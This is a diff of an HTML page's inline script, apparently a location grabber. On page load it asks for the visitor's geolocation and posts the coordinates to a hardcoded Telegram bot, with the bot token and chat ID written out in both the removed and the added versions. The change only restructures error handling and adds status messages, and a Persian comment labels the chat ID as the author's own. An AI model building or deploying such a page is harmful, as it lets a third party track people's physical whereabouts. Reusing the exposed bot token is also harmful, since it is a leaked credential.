@@ -11,48 +11,62 @@
 
   <script>
     window.onload = function () {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          function (position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+      const status = document.getElementById('status');
 
-            const token = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
-            const chatId = '7570861617';
-            const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
-
-            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-              })
-            })
-            .then(response => response.json())
-            .then(data => {
-              if (data.ok) {
-                document.getElementById('status').innerText = "✅ Location sent successfully!";
-              } else {
-                document.getElementById('status').innerText = "❌ Failed to send location.";
-                console.error("Telegram error:", data);
-              }
-            })
-            .catch(error => {
-              document.getElementById('status').innerText = "❌ Error sending location.";
-              console.error("Fetch error:", error);
-            });
-          },
-          function (error) {
-            document.getElementById('status').innerText = "❌ Location access denied.";
-            console.error("Geolocation error:", error);
-          }
-        );
-      } else {
-        document.getElementById('status').innerText = "❌ Geolocation not supported.";
+      if (!navigator.geolocation) {
+        status.innerText = "❌ Your browser does not support geolocation.";
+        return;
       }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          const token = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
+          const chatId = '7570861617';  // چت آی‌دی شما
+          const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
+
+          status.innerText = "📡 Sending location to Telegram...";
+
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          })
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              status.innerText = "✅ Location sent successfully!";
+            } else {
+              status.innerText = `❌ Telegram Error: ${JSON.stringify(data)}`;
+            }
+          })
+          .catch(error => {
+            status.innerText = `❌ Fetch Error: ${error}`;
+          });
+        },
+        error => {
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              status.innerText = "❌ Location permission denied.";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              status.innerText = "❌ Location unavailable.";
+              break;
+            case error.TIMEOUT:
+              status.innerText = "❌ Location request timed out.";
+              break;
+            default:
+              status.innerText = "❌ Unknown geolocation error.";
+          }
+        }
+      );
     };
   </script>
 </body>
